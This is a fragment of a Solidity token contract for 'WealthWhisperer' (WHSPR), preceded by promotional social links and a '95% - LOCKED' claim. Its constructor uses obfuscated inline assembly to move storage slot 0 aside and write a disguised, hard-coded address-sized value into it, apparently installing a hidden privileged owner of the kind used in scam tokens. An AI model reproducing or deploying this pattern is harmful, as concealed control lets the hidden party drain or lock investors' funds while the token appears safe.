...
Telegram: https://t.me/WealthWhisperer/
Twitter: https://twitter.com/WealthWhisperer/
Website: https://WealthWhisperer.finance
95% - LOCKED
...
contract WealthWhisperer {
    string public constant name = "WealthWhisperer";
    string public constant symbol = "WHSPR";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(398012044529621708889238277595508162303413372901, 4))}
